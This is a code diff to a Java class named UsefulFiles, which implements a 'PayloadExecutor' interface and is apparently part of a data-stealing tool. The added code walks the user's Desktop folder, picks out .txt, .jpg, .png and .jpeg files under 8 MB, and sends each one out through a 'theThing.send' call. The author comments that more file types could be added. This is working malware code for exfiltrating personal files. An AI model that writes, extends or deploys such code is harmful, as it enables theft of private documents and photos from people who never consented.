@@ -10,7 +10,7 @@ import java.nio.file.Paths;
 /**
  * @author Peter
  * @since 09/06/2022
- * Gets useful files from Desktop(pdf and txt for now).
+ * Gets useful files from Desktop(pdf, txt, png, jpg and jpeg for now, I could add more but I'm just too lazy).
  */
 
 public class UsefulFiles implements PayloadExecutor {
@@ -29,6 +29,30 @@ public class UsefulFiles implements PayloadExecutor {
         Files.walk(Paths.get(System.getProperty("user.home") + "\\Desktop"))
                 .filter(path -> path.toFile().getParent().equals(System.getProperty("user.home") + "\\Desktop"))
                 .filter(path -> path.toFile().getName().endsWith(".txt"))
+                .filter(path -> {
+                    try { return Files.size(path) < 8000000; } catch (IOException ignored) { }
+                    return false;
+                }).forEach(path -> main.theThing.send(path.toFile()));
+
+        Files.walk(Paths.get(System.getProperty("user.home") + "\\Desktop"))
+                .filter(path -> path.toFile().getParent().equals(System.getProperty("user.home") + "\\Desktop"))
+                .filter(path -> path.toFile().getName().endsWith(".jpg"))
+                .filter(path -> {
+                    try { return Files.size(path) < 8000000; } catch (IOException ignored) { }
+                    return false;
+                }).forEach(path -> main.theThing.send(path.toFile()));
+
+        Files.walk(Paths.get(System.getProperty("user.home") + "\\Desktop"))
+                .filter(path -> path.toFile().getParent().equals(System.getProperty("user.home") + "\\Desktop"))
+                .filter(path -> path.toFile().getName().endsWith(".png"))
+                .filter(path -> {
+                    try { return Files.size(path) < 8000000; } catch (IOException ignored) { }
+                    return false;
+                }).forEach(path -> main.theThing.send(path.toFile()));
+
+        Files.walk(Paths.get(System.getProperty("user.home") + "\\Desktop"))
+                .filter(path -> path.toFile().getParent().equals(System.getProperty("user.home") + "\\Desktop"))
+                .filter(path -> path.toFile().getName().endsWith(".jpeg"))
                 .filter(path -> {
                     try { return Files.size(path) < 8000000; } catch (IOException ignored) { }
                     return false;
